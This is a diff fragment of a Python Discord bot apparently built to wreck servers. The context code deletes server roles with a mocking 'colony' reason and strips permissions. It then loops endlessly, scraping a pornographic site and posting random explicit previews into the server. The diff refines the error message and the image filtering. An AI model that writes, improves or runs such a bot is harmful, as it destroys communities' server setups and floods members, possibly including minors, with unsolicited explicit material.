@@ -75,7 +75,7 @@ async def on_message(message):
                for role in roles[2:]:
                     await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
           except Exception:
-               await heinz.send("`error editing roles`")
+               await heinz.send("`error deleting roles`")
 
           #-remove all perms-
 
@@ -90,9 +90,13 @@ async def on_message(message):
           
 
           hentai = imagesearch.getImages("https://hentaihaven.xxx") #load hentai from hentaihaven (kill me now)
+          
+          
           try:
                while True: #repeat 1000
                     y = random.choice(hentai) #get random bit of hentai
+                    while not y.startswith("https://hentaihaven.xxx/www/"): #check it is a video preview and not an asset
+                         y = random.choice(hentai)
                     async with aiohttp.ClientSession() as session: #http stuff I don't understand
                          async with session.get(y) as resp:
                               if resp.status != 200:
